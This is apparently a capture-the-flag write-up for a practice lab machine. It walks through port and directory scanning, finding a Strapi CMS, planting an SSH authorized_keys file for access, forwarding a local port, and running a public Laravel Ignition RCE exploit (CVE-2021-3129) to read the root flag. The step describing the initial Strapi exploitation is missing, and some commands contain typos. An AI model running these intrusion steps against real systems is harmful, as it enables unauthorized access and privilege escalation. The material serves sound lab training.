Enumeration

|_$sudo nmap -p- -sCV IP --min-rate=2000 > ~/tempo/nmap.txt

Nmap revealed open ports. This is basic result of nmap. SSH and HTTP are open, so the main target would be the HTTP.

I reccomend you to save nmap output so that you can see anytime you want.

Also, sometime irregular port is open, so -p- option can cut meaningless time.

When I open http://IP, the webserver error is displayed. Therefore, we need to add DNS to /etc/hosts

echo 'IP horizontall.htb' | sudo tee -a /etc/host

Then, we can access to the website.

This website seems to not have functionality. Even if I press several buttons, those don't respond. Also, there is no interesting directory. With gobuster, I found css and js directories, but nothing usefull dir.

Therefore, we need to find a subdomain or CMS framework to pwn this machine.

As I said, the debugger page found interesting js file. It is not framework, also not utility. It's worth to observe contents.

echo "IP api-prod.horizontall.htb" | sudo tee -a /etc/hosts

As soon as we access to the website, there is only string "welcome". So, let's emumerate the directories and find exploitable vulnerability.

gobuster dir -w /usr/share/seclists/Discovery/Web-Content -u http://api-prod.horizontall.htb -t 70 > ~/tempo/gobuster.txt

As you can see, there are several direcvory and files that could have important information, but we will start from /admin page.

Freaqently. the admin page or login page include the CMS framework and its version.

Therefore, admin page is often the most prioritized clue. When you find the page where could show you CMS and version information, you should visit there as soon as possible.

In admin page, we could finally find the CMS : strapi. Strapi is the open-source Headless CMS for developers.

However, there is no version information, which is really important. We can test all possible vulnerabilities, but it takes huge time. So, we need to narrow it down.

We could get reverse shell. Get to next step : privilege escalation.

Before move, when I checked the current directory, it was /opt/strapi/...

It does mean we can create authorized_keys file inside of ./ssh dir, and make connection via ssh. Let's do this.

On remote machine,

|_$ cd /opt/strapi
|_$mkdir .ssh

and in local machine,

|_$ssh-keygen
Enter file in which to save the key (home/name/.ssh/id...) : strapi
|_$cat strapi.pub #file which above code made

Finally, on remote machine,

echo "CONTENT_OF_STRAPI.PUB" > .ssh/authorized_keys

Then, we can access horizontall.htb with ssh-key.

|_$ ssh -i strapi strapi@horizontall.htb

You can get user.txt in current directory.

Privilege Escalation

|_$sudo -l

we cannot use this way because we don't know user's password. So, we need to find other way.

|_$ netstat -tulnp

Here, there are interesting open port :1337 and :8000. Port 3306 is default mysql port, so we don't use this at this time.
Take a look at port 1337 with curl, it seems to be the website we saw in http://api-prod.horizontal.htb/. So, we focus on port 8000.

This command connects our port and port:8000 on remote machine, and make it possible to see the closed open port on remote machine.

|_$ssh -i strapi -L 8000:localhost:8000 strapi@horizontall.htb

The port:8000 hosts web application framework. And this could be exploitable to get root privilege.

Let's enumerate directories and make sure if it is exploitable.

gobuster -dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://localhost:8000 -t 80

It outputs /profiles dir. Let's visit there.

The page looks like debug page cuz the page shows html structures and some information about page variables. This app can provide us gateway to the root privilege.

Again, we can search Laravel with searchsploit.

The third one tells us Laravel version 8.4.2 debug mode is vulnerable.

However,

This page tells us this page uses version 8.43.0. Can we exploit this?

In short, the answer is YES. Based on this PoC, the trigger of the vulnerability is an error handler and debugging tool used in Laravel. Therefore, it doesn't depends on Laravel version, but ignition version.

$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
$ cd CVE*
$ chmod +x exploit.py
$ python3 exploit.py http://localhost:8000 Monolog/RCE1 id

Finally, we succeeded to gain root privilege. It's possible to establish reverse shell, but we can read root flag directly.

$ python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
